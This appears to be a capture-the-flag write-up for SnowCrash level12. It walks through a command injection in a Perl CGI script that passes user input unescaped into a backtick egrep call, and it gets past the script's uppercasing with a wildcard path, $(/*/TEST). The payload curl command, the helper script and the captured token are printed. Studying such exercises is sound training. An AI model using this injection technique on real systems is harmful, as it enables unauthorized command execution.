We found this Perl script in the user's home directory:

```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1]; # y
  $xx = $_[0]; # x
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) { # recupere le resultat
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```

It's a lot of code for not much in the end. These two lines respectively set the variable x to uppercase and remove all after the first space:

```
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
```

This means that we can't directly enter commands like getflag, which would immediately turn into GETFLAG.

The rest of the code is not really interesting; it's useless in our exploitation. The vulnerability lies here:

```perl
@output = `egrep "^$xx" /tmp/xd 2>&1`;
```
In reality, user input is not validated, and we can write almost anything we want. The problem remains the capitalization.

To work around this problem, we can place the getflag command inside a file that is already named in uppercase; this allows us to bypass the two parameter modifications. We can then execute the script by sending a bash command as a parameter, such as $(./TEST).

I've created a small TEST script:

```bash
#!/bin/bash

getflag > /tmp/flag
```

The problem with this script is that it's located here: `/tmp/TEST`. The server is not in the tmp directory; it needs the absolute path. If we try to send the file path as a parameter, it will transform into `/TMP/TEST`.


As a solution, we can simply ask the server to execute all TEST scripts present in this file hierarchy: /*/TEST. This allows us to avoid entering /tmp in plain text and convert it to uppercase.

Don't forget to make the script executable:

```
chmod a+x TEST
```

And here is the payload.
```
level12@SnowCrash:/tmp$ curl '127.0.0.1:4646?x=$(/*/TEST)&y=salut'
.level12@SnowCrash:/tmp$^C
level12@SnowCrash:/tmp$ cat /tmp/flag
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```